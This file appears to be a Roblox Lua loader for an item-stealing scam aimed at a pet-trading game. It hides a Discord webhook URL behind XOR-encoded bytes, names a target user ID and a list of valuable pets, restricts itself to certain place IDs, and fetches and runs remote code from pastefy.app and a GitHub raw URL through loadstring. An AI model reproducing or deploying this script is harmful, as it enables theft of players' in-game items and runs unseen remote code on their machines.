local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local b = {203,215,215,211,208,153,140,140,199,202,208,192,204,209,199,141,192,204,206,140,194,211,202,140,212,198,193,203,204,204,200,208,140,146,150,144,145,149,147,149,144,145,145,146,146,149,144,154,154,146,147,151,140,146,210,202,240,155,213,231,199,154,198,242,249,242,229,241,242,201,228,244,239,200,238,215,239,229,229,154,249,146,196,148,239,247,193,244,242,202,232,203,149,200,228,230,233,154,238,252,245,238,213,245,149,200,207,250,219,196,206,201,209,154,201,215,225,235,229,226,214}
    local k = 163
    local o = {}
    for i = 1, #b do o[i] = string.char(bit32.bxor(b[i], k)) end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 9426261899

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "La Ginger Sekolah",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Capitano Americano",
    "Los Spaghettis",
    "Rubrikiko",
    "Examen Bros",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Cloverat Clapat",
    "La Summer Grande",
    "Los Tictacs",
    "Spaghetti Tualetti",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "La Easter Grande",
    "Steakini Fattini",
    "Garama and Madundung",
    "La Anniversary Grande",
    "Nacho Spyder",
    "Rosetti Tualetti",
    "Rubiko and Kubiko",
    "Fishino Clownino",
    "Jolly Jolly Sahur",
    "Gym Bros",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Orcaledon",
    "Abyssaloco",
    "Fragola La La La",
    "Los Tacoritas",
    "Lovin Rose",
    "Globa Steppa",
    "Tralaledon",
    "Celularcini Viciosini",
    "Tacorita Bicicleta",
    "Noo my examine",
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237,
    78906538690694,
    119594317142884,
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/KdnESnOL/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
